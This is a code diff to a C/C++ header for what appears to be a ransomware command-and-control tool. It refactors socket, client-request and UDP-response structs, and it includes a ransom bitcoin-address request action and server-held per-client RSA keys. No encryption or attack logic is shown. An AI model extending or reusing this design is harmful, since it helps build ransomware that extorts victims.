@@ -29,14 +29,14 @@ enum SocketTypes {
     Servers have a socket file descriptor which is used
     to send and receive information over sockets.
 */
-struct Server {
+typedef struct {
     int                sfd;      // Socket File Descriptor
     int                domain;   
     int                type;     // Communcation semmantic type. All servers are SOCK_STREAM
     int                protocol; // Server protocol. All server protocols will be 0.
     int                port;     
     struct sockaddr_in addr;     // address struct with info on the server address
-};
+} Server;
 
 /*
     A struct representing a message sent from
@@ -78,6 +78,12 @@ typedef struct {
         otherwise this can be an empty string
     */
     std::string        commandLineArguments;
+
+    /*
+        The uniquely generated public RSA encryption key
+        that is stored on the server alongside the private RSA
+        encryption key. Used to encrypt.
+    */
     std::string        publicEncryptionKey;
 
     // the action to perform of RemoteAction enum
@@ -96,18 +102,18 @@ typedef struct {
         REQUEST_RANSOM_BTC_ADDRESS = 0x400000,
     };
 
-    BOOL               valid;
-    Action             action;
-    void*              client;
-    std::string temp;
+    BOOL              valid;
+    Action            action;
+    void* client;
+    std::string       temp;
 } ClientRequest, ClientMessage;
 
 // A response from the udp server to the udp client
 // contains information about the tcp server
-struct UDPResponse {
-    Server             TCPServer; // Info about the tcp server so the client can connect to it
+typedef struct {
+    Server  TCPServer; // Info about the tcp server so the client can connect to it
     BOOL               isValid;
-};
+} UDPResponse, UDPMessage;
 
 
 #endif
